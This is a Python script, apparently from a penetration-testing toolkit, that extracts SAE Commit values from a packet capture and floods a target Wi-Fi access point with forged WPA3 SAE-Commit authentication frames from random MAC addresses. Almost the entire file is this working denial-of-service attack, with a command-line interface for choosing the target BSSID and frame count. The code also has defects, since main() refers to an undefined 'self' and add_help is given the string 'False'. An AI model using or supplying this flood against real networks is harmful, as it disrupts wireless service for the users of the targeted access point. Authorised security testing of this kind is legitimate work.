#!/usr/bin/env python3
import argparse
import random
import sys; sys.path.append(__file__.rsplit("/", 1)[0])

from scapy.all import sendp, RadioTap, Dot11, Dot11Auth, rdpcap

from ptlibs import ptjsonlib, ptprinthelper, ptmisclib
from ptlibs.ptprinthelper import ptprint

from _version import __version__


def extract_sae_commit_values(pcap_file):
    """
    Extract 32-byte scalar and finite-field elements from SAE Commit frames in a PCAP.
    """
    packets = rdpcap(pcap_file)

    scalars = []
    finites = []
    for pkt in packets:
        if pkt.haslayer(Dot11Auth) and len(pkt) > 140:
            auth_payload = bytes(pkt[Dot11Auth])
            scalars.append(auth_payload[-64:-32])
            finites.append(auth_payload[-32:])

    return scalars, finites

def rand_mac():
    return ':'.join(f'{random.randint(0, 255):02x}' for _ in range(6))

def auth_frame(bssid):
    client = rand_mac()
    return (
        RadioTap() /
        Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid) /
        Dot11Auth(algo=3, seqnum=1, status=0)
    )

def construct_commit(bssid, scalar_list, finite_list):
    """
    Build one SAE-Commit frame using random extracted scalar + finite element.
    """
    return auth_frame(bssid) / b'\x13\x00' / random.choice(scalar_list) / random.choice(finite_list)

def attack(bssid, iface, count, scalar_list, finite_list):
    """
    Send `count` SAE-Commit frames as a tight burst (inter=0.0001s).
    """
    if not scalar_list or not finite_list:
        print("ERROR: No scalars or finite elements extracted—nothing to send.", file=sys.stderr)
        sys.exit(1)

    print(f"Injecting {count} SAE-Commit frames on {iface} to {bssid} "
          f"(using {len(scalar_list)} scalars, {len(finite_list)} finites)")
    # build a single frame and let sendp repeat it `count` times
    frame = construct_commit(bssid, scalar_list, finite_list)
    sendp(frame,
          iface=iface,
          count=count,
          inter=0.0001,   # fixed 100 μs between packets
          verbose=False)
    print(f"Done: {count} frames sent.")


def get_help():
    return [
        {"description": ["SAE-Commit flood using extracted scalars & finite elements from a PCAP"]},
        {"usage": ["commit_overflow <options>"]},
        {"usage_example": [
            "commit_overflow -f file.pcap -i wlan0mon -b 00:11:22:33:44:55 -n 200",
        ]},
        {"options": [
        ["-f", "--file",      "<file>",       "PCAP file containing SAE-Commit frames"],
        ["-i", "--iface",     "<interface>",  "Monitor-mode interface (e.g., wlan0mon)"],
        ["-b", "--bssid",     "<bssid>",      "Target AP BSSID"],
        ["-n", "--count",     "<count>",      "Total number of frames to send"],
        ["-v",  "--version",  "",             "Show script version and exit"],
        ["-h",  "--help",     "",             "Show this help message and exit"],
        ["-j",  "--json",     "",             "Output in JSON format"],
        ]
        }]

def parse_args():
    parser = argparse.ArgumentParser(
        description="SAE-Commit flood using extracted scalars & finite elements from a PCAP",
        add_help="False"
    )
    parser.add_argument('-f', '--file',
                   required=True,
                   help="PCAP file containing SAE-Commit frames")
    parser.add_argument('-i', '--iface',
                   required=True,
                   help="Monitor-mode interface (e.g., wlan0mon)")
    parser.add_argument('-b', '--bssid',
                   required=True,
                   help="Target AP BSSID")
    parser.add_argument('-n', '--count',
                   required=True, type=int,
                   help="Total number of frames to send")

    parser.add_argument("-j", "--json", action="store_true")
    parser.add_argument("-v", "--version", action='version', version=f'{SCRIPTNAME} {__version__}')

    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        ptprinthelper.help_print(get_help(), SCRIPTNAME, __version__)
        sys.exit(0)

    args = parser.parse_args()
    ptprinthelper.print_banner(SCRIPTNAME, __version__, args.json, space=0)
    return args


def main():
    global SCRIPTNAME
    SCRIPTNAME = "ptcommitoverflow"
    args = parse_args()
    scalars, finites = extract_sae_commit_values(args.file)
    print(f"Extracted {len(scalars)} scalars and {len(finites)} finite elements")
    attack(
        bssid=args.bssid,
        iface=args.iface,
        count=args.count,
        scalar_list=scalars,
        finite_list=finites
    )

    self.ptjsonlib.set_status("finished")
    ptprint(self.ptjsonlib.get_result_json(), "", self.args.json)

if __name__ == "__main__":
    main()
